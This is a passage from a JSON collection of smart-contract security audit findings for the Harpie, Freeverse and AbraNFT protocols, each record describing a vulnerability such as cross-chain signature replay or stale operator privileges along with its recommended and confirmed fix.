      "content": "Source: https://github.com/sherlock-audit/2022-09-harpie-judging/tree/main/004-M \n\n## Found by \nminhquanym, JohnSmith, IllIllI\n\n## Summary\nMistakes made on one chain can be re-applied to a new chain\n\n## Vulnerability Detail\nThere is no `chain.id` in the signed data\n\n## Impact\nIf a user does a `changeRecipientAddress()` using the wrong network, an attacker can replay the action on the correct chain, and steal the funds a-la the wintermute gnosis safe attack, where the attacker can create the same address that the user tried to, and steal the funds from there\n\n## Code Snippet\nhttps://github.com/Harpieio/contracts/blob/97083d7ce8ae9d85e29a139b1e981464ff92b89e/contracts/Vault.sol#L60-L73\n\n## Tool used\n\nManual Review\n\n## Recommendation\nInclude the `chain.id` in what's hashed\n\n## Harpie Team\nAdded chainId to signature and signature validation. Fix [here](https://github.com/Harpieio/contracts/pull/4/commits/de24a50349ec014163180ba60b5305098f42eb14).\n\n## Lead Senior Watson\nThis is true assuming the contract address is the same across other chains. Confirmed fix.",
      "summary": "\nThis bug report is about a vulnerability found in the `changeRecipientAddress()` function of the Harpie Vault smart contract. It was found by minhquanym, JohnSmith, and IllIllI, and was tested using manual review. \n\nThe vulnerability is that there is no `chain.id` in the signed data, which means that mistakes made on one chain can be re-applied to a new chain. This could lead to a cross-chain replay attack, where an attacker could create the same address that the user tried to, and steal the funds from there. \n\nThe Harpie Team fixed the vulnerability by adding the `chain.id` to the signature and signature validation, and this fix was confirmed by Lead Senior Watson. The fix can be found in the link provided in the report.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Harpie",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-09-harpie-judging/tree/main/004-M",
      "tags": [
        "Cross Chain",
        "Replay Attack"
      ],
      "finders": [
        "minhquanym",
        "IllIllI",
        "JohnSmith"
      ]
    },
    {
      "id": "3373",
      "title": "M-1: Use `safeTransferFrom()` instead of `transferFrom()` for outgoing erc721 transfers",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-09-harpie-judging/tree/main/001-M \n\n## Found by \nCodingNameKiki, millers.planet, 0xNazgul, cccz, Bnke0x0, Chom, Waze, IEatBabyCarrots, TomJ, Tomo, hickuphh3, pashov, sach1r0, Sm4rty, IllIllI, chainNue, Dravee\n\n## Summary\n\nIt is recommended to use `safeTransferFrom()` instead of `transferFrom()` when transferring ERC721s out of the vault.\n\n## Vulnerability Detail\n\nThe `transferFrom()` method is used instead of `safeTransferFrom()`, which I assume is a gas-saving measure. I however argue that this isn’t recommended because:\n\n- [OpenZeppelin’s documentation](https://docs.openzeppelin.com/contracts/4.x/api/token/erc721#IERC721-transferFrom-address-address-uint256-) discourages the use of `transferFrom()`; use `safeTransferFrom()` whenever possible\n- The recipient could have logic in the `onERC721Received()` function, which is only triggered in the `safeTransferFrom()` function and not in `transferFrom()`. A notable example of such contracts is the Sudoswap pair:\n\n```solidity\nfunction onERC721Received(\n  address,\n  address,\n  uint256 id,\n  bytes memory\n) public virtual returns (bytes4) {\n  IERC721 _nft = nft();\n  // If it's from the pair's NFT, add the ID to ID set\n  if (msg.sender == address(_nft)) {\n    idSet.add(id);\n  }\n  return this.onERC721Received.selector;\n}\n```\n\n- It helps ensure that the recipient is indeed capable of handling ERC721s.\n\n## Impact\n\nWhile unlikely because the recipient is the function caller, there is the potential loss of NFTs should the recipient is unable to handle the sent ERC721s.\n\n## Code Snippet\n\n[https://github.com/Harpieio/contracts/blob/97083d7ce8ae9d85e29a139b1e981464ff92b89e/contracts/Vault.sol#L137](https://github.com/Harpieio/contracts/blob/97083d7ce8ae9d85e29a139b1e981464ff92b89e/contracts/Vault.sol#L137)\n\n## Recommendation\n\nUse `safeTransferFrom()` when sending out the NFT from the vault.\n\n```diff\n- IERC721(_erc721Address).transferFrom(address(this), msg.sender, _id);\n+ IERC721(_erc721Address).safeTransferFrom(address(this), msg.sender, _id);\n```\n\nNote that the vault would have to inherit the `IERC721Receiver` contract if the change is applied to `Transfer.sol` as well.\n\n## Harpie Team\n\nAdded safeTransferFrom in withdraw function. Fix [here](https://github.com/Harpieio/contracts/pull/4/commits/aff1ee38e081194dd7d88835c37c864e759fd289).\n\n## Lead Senior Watson\n\nMakes sense to be compatible with contracts as recipients. Confirmed fix.",
      "summary": "\nThis bug report is about the issue of using `safeTransferFrom()` instead of `transferFrom()` when transferring ERC721s out of the vault. It was found by CodingNameKiki, millers.planet, 0xNazgul, cccz, Bnke0x0, Chom, Waze, IEatBabyCarrots, TomJ, Tomo, hickuphh3, pashov, sach1r0, Sm4rty, IllIllI, chainNue, and Dravee. \n\nThe problem lies in the fact that `transferFrom()` is used instead of `safeTransferFrom()`, which is likely done for gas-saving reasons. However, OpenZeppelin’s documentation discourages the use of `transferFrom()` and suggests using `safeTransferFrom()` whenever possible. This is because some contracts have logic in the `onERC721Received()` function, which is only triggered in the `safeTransferFrom()` function and not in `transferFrom()`. This helps ensure that the recipient is indeed capable of handling ERC721s. \n\nThe impact of this issue is that there is a potential loss of NFTs should the recipient be unable to handle the sent ERC721s. The code snippet associated with this issue is available at https://github.com/Harpieio/contracts/blob/97083d7ce8ae9d85e29a139b1e981464ff92b89e/contracts/Vault.sol#L137. \n\nThe recommended solution is to use `safeTransferFrom()` when sending out the NFT from the vault. The Harpie Team has added this function to the withdraw function, and the fix can be found at https://github.com/Harpieio/contracts/pull/4/commits/aff1ee38e081194dd7d88835c37c864e759fd289. Lead Senior Watson has confirmed the fix.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Harpie",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-09-harpie-judging/tree/main/001-M",
      "tags": [],
      "finders": [
        "IllIllI",
        "pashov",
        "0xNazgul",
        "chainNue",
        "millers.planet",
        "cccz",
        "Waze",
        "TomJ",
        "hickuphh3",
        "Dravee",
        "Chom",
        "CodingNameKiki",
        "Bnke0x0",
        "Tomo",
        "sach1r0",
        "Sm4rty",
        "IEatBabyCarrots"
      ]
    },
    {
      "id": "10536",
      "title": "Redundant check of unused and signed data",
      "impact": "LOW",
      "content": "In the [`assertBidInputsOk` function](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/auction/base/AuctionBase.sol#L224) of the [`AuctionBase` contract](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/auction/base/AuctionBase.sol), incoming bid data is checked and verified based on the state of the auction. In the case of `State.Auctioning`, it is required that the `bidInput.feeBPS` and `bidInput.endsAt` values align with the values that were saved during the initial bid. [Both checks](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/auction/base/AuctionBase.sol#L253-L263) are redundant for two reasons:\n\n\n1. The provided call values `bidInput.feeBPS` and `bidInput.endsAt` are not being used.\n2. The operator signed these values so they are expected to match. This is contradictory and undermines the given strong trust assumption.\n\n\nThe checks are for user experience only, mainly to guarantee on a contract level that the user does not provide different values than the initial data. This could lead to a user paying a different fee than expected.\n\n\nConsider moving these checks off-chain to save some gas and simplify the code.\n\n\n***Update**: Fixed with commit `715f28a` of [PR#9](https://github.com/freeverseio/crypto-payments/pull/9).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Freeverse Crypto Payments Audit",
      "source_link": "https://blog.openzeppelin.com/freeverse-crypto-payments-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10535",
      "title": "Inaccurate revert string",
      "impact": "LOW",
      "content": "The [`withdrawTo`](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/buyNow/base/BuyNowBase.sol#L154) function will revert with the message [`tx sender not authorized to withdraw on recipients behalf`](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/buyNow/base/BuyNowBase.sol#L157) in the case that the given `recipient` is set to false in the `onlyUserCanWithdraw` mapping.\n\n\nThis function should not revert if the passed in `recipient` address is the same as the address calling the function.\n\n\nConsider updating the logic to never revert when a user attempts to withdraw their own funds with the `withdrawTo` function.\n\n\n***Update**: Fixed with commit `b5db284` of [PR#10](https://github.com/freeverseio/crypto-payments/pull/10/).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Freeverse Crypto Payments Audit",
      "source_link": "https://blog.openzeppelin.com/freeverse-crypto-payments-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10534",
      "title": "Gas optimization",
      "impact": "LOW",
      "content": "In the [`_processBid` function](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/auction/base/AuctionBase.sol#L105) of the [`AuctionBase` contract](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/auction/base/AuctionBase.sol), the `BidInput` struct is processed from `memory`. Further, that struct is propagated to the [`assertBidInputsOk` function](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/auction/base/AuctionBase.sol#L224), where the inputs are sent via `memory` again, while they are defined as `calldata` in the [`IAuctionBase` interface](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/auction/base/IAuctionBase.sol#L237).\n\n\nConsider changing both locations from `memory` to `calldata` to save gas.\n\n\nIn the [`assertBidInputsOk` function](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/auction/base/AuctionBase.sol#L224) of the [`AuctionBase` contract](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/auction/base/AuctionBase.sol), the `bidInput` requirements are checked. These checks include, whether the `bidInput.deadline` is met and if the `bidInput.seller` should be registered. Further checks are based on the state of a payment that is fetched from the state of the blockchain.\n\n\nConsider moving [line 229](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/auction/base/AuctionBase.sol#L229), to line 240 to save some gas getting the payment state if one of the two mentioned checks fail.\n\n\n***Update**: Fixed with commit `00705cc` of [PR#11](https://github.com/freeverseio/crypto-payments/pull/11).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Freeverse Crypto Payments Audit",
      "source_link": "https://blog.openzeppelin.com/freeverse-crypto-payments-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10533",
      "title": "_acceptedCurrency could be misleading",
      "impact": "LOW",
      "content": "Due to the support of ERC20s and blockchain native currencies, payments are settled through the currency indicated by the [`_acceptedCurrency` variable](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/buyNow/base/BuyNowBase.sol#L48) that is set during deployment in the [`BuyNowBase` constructor](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/buyNow/base/BuyNowBase.sol#L48).\n\n\nSince this variable is passed in rather than obtained via calling the `name` or `symbol` functions of the ERC20s, it is possible to have a different underlying currency than the one claimed to be supported, possibly resulting in an uncareful user accidentally paying an unexpected price.\n\n\nConsider implementing the `_acceptedCurrency` through the symbol or name view function of the underlying ERC20 contract with a fallback to the native currency, as well as maintaining a manual method for cases of ERC20s that do not support those functions.\n\n\n***Update**: Fixed with commit `bd26283` of [PR#17](https://github.com/freeverseio/crypto-payments/pull/17).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Freeverse Crypto Payments Audit",
      "source_link": "https://blog.openzeppelin.com/freeverse-crypto-payments-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10532",
      "title": "Withdraw with finalBalance adds unnecessary complexity",
      "impact": "LOW",
      "content": "In the [`BuyNowBase` contract](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/buyNow/base/BuyNowBase.sol), the [`_withdrawAmount` function](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/buyNow/base/BuyNowBase.sol#L320) takes three arguments: The `recipient`, who’s balance is withdrawn, the `amount`, and a `finalBalance`. `finalBalance` is used to set the balance state of the recipient, which adds unnecessary complexity and is error prone.\n\n\nConsider updating the balance by subtracting the withdrawn amount like `_balanceOf[recipient] -= amount;` in order to simplify the function.\n\n\n***Update**: Fixed with commit `d9bd95a` of [PR#12](https://github.com/freeverseio/crypto-payments/pull/12).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Freeverse Crypto Payments Audit",
      "source_link": "https://blog.openzeppelin.com/freeverse-crypto-payments-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10531",
      "title": "Loose restriction on fees",
      "impact": "LOW",
      "content": "Currently, fees on buys and won auctions are not restricted and can be arbitrarily set for up to 100% via the `assertBidInputsOK` function in the [`BuyNowBase`](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/buyNow/base/BuyNowBase.sol#L395) and [`AuctionBase`](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/auction/base/AuctionBase.sol#L245-L248) contracts. Such `feeBPS` value is given through the input data that is signed by the operator.\n\n\nDespite the trust assumption towards the operator, consider limiting the fee to a lower percentage or setting it on a contract level similar to the `_paymentWindow`. By doing so it is less likely that the seller gets less funds than intended due to an unexpectedly high fee.\n\n\n***Update**: Fixed with commit `bfa52af` of [PR#13](https://github.com/freeverseio/crypto-payments/pull/13).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Freeverse Crypto Payments Audit",
      "source_link": "https://blog.openzeppelin.com/freeverse-crypto-payments-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10530",
      "title": "Events lack previous values",
      "impact": "LOW",
      "content": "There are a couple instances of events which are emitted when the state of the contract is changed. Among these events, some only record the new value and omit recording the previous value.\n\n\nHere are instances of this issue:\n\n\n* [`event EIP712`](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/buyNow/base/IBuyNowBase.sol#L67)\n* [`event PaymentWindow`](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/buyNow/base/IBuyNowBase.sol#L74)\n* [`event OnlyUserCanWithdraw`](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/buyNow/base/IBuyNowBase.sol#L91)\n* [`event DefaultFeesCollector`](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/roles/FeesCollectors.sol#L25)\n* [`event UniverseFeesCollector`](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/roles/FeesCollectors.sol#L32)\n* [`event DefaultOperator`](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/roles/Operators.sol#L28)\n* [`event UniverseOperator`](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/roles/Operators.sol#L35)\n* [`event DefaultAuctionConfig`](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/auction/base/IAuctionBase.sol#L88-L92)\n* [`event UniverseAuctionConfig`](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/auction/base/IAuctionBase.sol#L105-L110)\n\n\nWhen using events to record state changes, it is recommended to record the previous value as well to document the entirety of the change. Consider including the previous state to any event that changes the state of the contract.\n\n\n***Update**: Fixed with commit `6e02cc3` of [PR#14](https://github.com/freeverseio/crypto-payments/pull/14).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Freeverse Crypto Payments Audit",
      "source_link": "https://blog.openzeppelin.com/freeverse-crypto-payments-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10529",
      "title": "Seller’s signature not required",
      "impact": "MEDIUM",
      "content": "In this protocol, listing an asset is simply having the operator sign either a [`BidInput`](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/auction/base/ISignableStructsAuction.sol#L19) or a [`BuyNowInput`](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/buyNow/base/ISignableStructsBuyNow.sol#L18) struct. From there, once a buyer either places a bid or completes a buy-it-now listing, the struct will be saved on-chain. When processing either type of struct, the only requirements around signing is a valid signature from the operator.\n\n\nNowhere in the process is it required for the seller to signal that they intend to sell their asset. Requiring the seller’s signature over the listing would ensure that the origin of the listing was the seller itself. If a signature was not required, users could create phony listings that will never complete.\n\n\nSince the seller is required to actually transfer an asset at the end of a listing, the worst situation that should arise would be a large number of listings that do not complete after they end, resulting in users’ funds being locked for small periods of time.\n\n\nConsider requiring the seller’s signature along with the operator’s when listing assets.\n\n\n***Update**: Partially fixed with commit `097fa4c` of [PR#18](https://github.com/freeverseio/crypto-payments/pull/18). Seller validation is done with a signature over the `paymentId`, which does not remove the need for trust between operator and seller. However, the upgradability allowed via the EIP712 implementation contract allows for future updates which remedy this.*\n\n\n***The Freeverse team states:***\n\n\n\n> Following your suggestion, we decided to start, at least, with what we already have, and require the already-existing L2 sellerSignature to be provided to the payments contract. The data that makes paymentId is available off chain.\n> \n> \n> However, we also agreed with your point and decided that it’ll be nicer to move to a pattern where the seller signature is much closer to the others, so that the payments contract can verify the seller’s intention pre-digest.\n> \n> \n> That’s why the PR intentionally provides an interface for verifySellerSignature where future upgrades of the verification contract (via the setEIP712 method) can include implementations where the verification of the sellerSig makes use of the entire BuyNow/Auction input struct, as suggested. (note that verifySellerSignature already takes as inputs the entire bidInput/buynowInput struct).\n> \n> \n> Since changing the L2 current signature will take time (we first need to fill in details such as the not 1-to-1 mapping, and upgrades require coordination with nodes, etc.), we plan to do it carefully, and incorporate the suggestion using the setEIP712 method in due time.\n> \n>",
      "summary": "\nThis bug report is related to the protocol of listing an asset. It is currently required that the operator signs either a BidInput or a BuyNowInput struct. However, the seller is not required to signal that they intend to sell the asset. This could lead to phony listings that will never complete, resulting in users’ funds being locked for small periods of time.\n\nThe Freeverse team has partially fixed the issue by requiring the seller's signature over the paymentId. This does not completely remove the need for trust between the operator and seller, but it does allow for future updates that could remedy this. The team is planning to carefully incorporate the suggestion using the setEIP712 method in due time.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Freeverse Crypto Payments Audit",
      "source_link": "https://blog.openzeppelin.com/freeverse-crypto-payments-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10528",
      "title": "Previous operator power is not revoked",
      "impact": "MEDIUM",
      "content": "During the process of a buy action within [`_processBuyNow`](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/buyNow/base/BuyNowBase.sol#L196) and bid action within [`_processBid`](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/auction/base/AuctionBase.sol#L105), the payment details are saved on-chain using the `_payments` mapping. This includes the current operator address at the time of action, fetched through the `universeOperator` function within the `BuyNowERC20.buyNow`, `BuyNowERC20.relayedBuyNow`, `BuyNowNative.buyNow`, `AuctionERC20.bid`, `AuctionERC20.relayedBid`, and `AuctionNative.bid` functions.\n\n\nIn the case of an operator change, after the payment details have been written on-chain, there is no way to revoke the power of an operator. This means, if an operator’s key was compromised and that operator is saved as the operator in charge of a listing in the `_payments` mapping, they could still finalize a payment or auction with an untruthful `transferResult.wasSuccessful` outcome even after changing the current operator for the universe.\n\n\nFor instance, after the first bid on an auction and a consecutive operator change, the previous operator can bid and win the auction to then get the asset transferred. But during finalization they are able to sign that the asset transfer was not successful to also get the refund. Similarly, if the operator knows they are exchanged in the future, they can buy an asset or win an auction to then maliciously finalize the payment the same way.\n\n\nConsider revoking the power of any previous operator, e.g., by fetching the current operator through the [`universeOperator` function](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/roles/Operators.sol#L91) inside the [`_finalize` function](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/buyNow/base/BuyNowBase.sol#L241). The returned address can then be checked against the provided signature to assure that only the current operator can finalize a payment. In addition, remove the operator from the [`Payments` struct](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/buyNow/base/IBuyNowBase.sol#L155).\n\n\n***Update**: Fixed with commit `ff4ff3b` of [PR#15](https://github.com/freeverseio/crypto-payments/pull/15).*",
      "summary": "\nThis bug report is about the process of buying and bidding on an asset on the Freeverseio platform. The issue is that when an operator change occurs after the payment details have been written on-chain, there is no way to revoke the power of the old operator. This means, if the old operator's key was compromised, they could still finalize a payment or auction with an untruthful outcome even after changing the current operator for the universe. \n\nFor example, after the first bid on an auction and a consecutive operator change, the previous operator can bid and win the auction to then get the asset transferred. But during finalization, they can sign that the asset transfer was not successful to also get the refund. Similarly, if the operator knows they are exchanged in the future, they can buy an asset or win an auction to then maliciously finalize the payment the same way.\n\nTo fix this issue, the power of any previous operator should be revoked. This can be done by fetching the current operator through the universeOperator function inside the _finalize function. The returned address can then be checked against the provided signature to assure that only the current operator can finalize a payment. In addition, the operator should be removed from the Payments struct. This issue has now been fixed with commit ff4ff3b of PR#15.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Freeverse Crypto Payments Audit",
      "source_link": "https://blog.openzeppelin.com/freeverse-crypto-payments-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10527",
      "title": "Misconfiguration could lead to blocking bids",
      "impact": "MEDIUM",
      "content": "In the [`_processBid` function](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/auction/base/AuctionBase.sol#L105) of the [`AuctionBase` contract](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/auction/base/AuctionBase.sol#L105) the time details of the auction are checked. These times are:\n\n\n* `extendableUntil` – The time until an auction may be extended through late bids.\n* `expirationTime` – The time until an asset must be transferred. Otherwise, the payment can be refunded by the user afterwards.\n\n\nThe requirement of [line 118](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/auction/base/AuctionBase.sol#L118) checks the following:\n\n\n\n\n```\nextendableUntil + _SAFETY_TRANSFER_WINDOW < expirationTime\n\n```\n\n\nHere, the `_SAFETY_TRANSFER_WINDOW` is a constant value of two hours. Therefore, the auction must expire after the longest possible duration, including enough time to transfer the asset. Further, substituting the values of `extendableUntil` and `expirationTime` and simplifying the inequation we receive:\n\n\n\n\n```\nuniverseExtendableBy(bidInput.universeId) + _SAFETY_TRANSFER_WINDOW < _paymentWindow\n\n```\n\n\nBoth values, `universeExtendableBy()` and `_paymentWindow`, are configurable by the contract owner. In the case that the system accidentally is configured to never satisfy the above condition, the requirement would always fail and so would calls to bid. No bids on new auctions would be processed, shutting down all upcoming auctions.\n\n\nConsider moving this requirement and adding additional checks when setting these configurations.\n\n\n***Update**: Fixed with commit `ef597b1` of [PR#16](https://github.com/freeverseio/crypto-payments/pull/16).*",
      "summary": "\nThis bug report is about the [`_processBid` function](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/auction/base/AuctionBase.sol#L105) of the [`AuctionBase` contract](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/auction/base/AuctionBase.sol#L105). The function checks the time details of the auction, which are `extendableUntil` and `expirationTime`. The requirement of [line 118](https://github.com/freeverseio/crypto-payments/blob/956a98e53ef540f7b2b40f3b923d0b0e3e5d32ef/contracts/auction/base/AuctionBase.sol#L118) checks if the auction expires after the longest possible duration, including enough time to transfer the asset. The system was accidentally configured to never satisfy this condition, which meant that calls to bid would fail and no bids on new auctions would be processed, shutting down all upcoming auctions. The bug has been fixed with commit `ef597b1` of [PR#16](https://github.com/freeverseio/crypto-payments/pull/16).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Freeverse Crypto Payments Audit",
      "source_link": "https://blog.openzeppelin.com/freeverse-crypto-payments-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "23042",
      "title": "[N-21] Comments should be enforced by `require()`s",
      "impact": "LOW",
      "content": "\nThe comments below should be enforced by `require(block.timestamp < uint64(-1))`\n\n```solidity\nFile: contracts/NFTPair.sol   #1\n\n311          loan.startTime = uint64(block.timestamp); // Do not use in 12e10 years..\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPair.sol#L311>\n\n```solidity\nFile: contracts/NFTPairWithOracle.sol   #2\n\n346          loan.startTime = uint64(block.timestamp); // Do not use in 12e10 years..\n```\n\n<https://github.com/code-423n4/2022-04-abranft/blob/5cd4edc3298c05748e952f8a8c93e42f930a78c2/contracts/NFTPairWithOracle.sol#L346>\n\n**[cryptolyndon (AbraNFT) commented](https://github.com/code-423n4/2022-04-abranft-findings/issues/75#issuecomment-1124529466):**\n > **Low-risk issues:**\n> \n> **[L-03]** Agreed; this does suggest ERC-20 transfers.\n>\n> **[L-04]** Simply requiring msg.value to be zero would break things when some, but not all, actions use it.\n>\n> **[L-05]** The zero address is pretty much the ONLY wrong address we could enter where actual loss of funds is not possible.\n\n> **Non-critical issues:**\n> \n> **[N-01]** Nonstandard NFT types that are popular enough to use warrant their own contract type.\n> \n> **[N-03]** This is not some example project intended to be forked and used with a wide range of different compiler setups.\n> \n> **[N-11]** As time ticks on 0.8.x becomes increasingly safe to use, but the suggested reason here does not even apply to our contract.\n> \n> **[N-12]** `bentoBox` is not a constant that will necessarily be invariable across different master contracts. Clones already work as suggested.\n> \n> **[N-13]** The contract is not meant to serve as sole documentation of our fee schedule.\n> \n> **[N-17]** We use nonces to prevent replay attacks, rather than storing used signatures. A different, equally valid, signature of the same data would be of no use to an attacker.\n> \n> **[N-21]** If you think this is going to be an issue, then think of all the gas wasted until then by even that single check! Time enough to write a V2.\n> \n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-04-abranft-findings/issues/75#issuecomment-1133671875):**\n > I believe this to be the most complete QA report.\n\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2022-04-abranft",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23041",
      "title": "[N-20] Non-exploitable re-entrancies",
      "impact": "LOW",
      "content": "\nCode should follow the best-practice of [check-effects-interaction](https://blockchain-academy.hs-mittweida.de/courses/solidity-coding-beginners-to-intermediate/lessons/solidity-11-coding-patterns/topic/checks-effects-interactions/)\n\nSee [original submission](https://github.com/code-423n4/2022-04-abranft-findings/issues/75) for details.\n\n        \n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Abracadabra Money",
      "source_link": "https://code4rena.com/reports/2022-04-abranft",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23040",
      "title": "[N-19] States/flags should use `Enum`s rather than separate constants",
      "impact": "LOW",
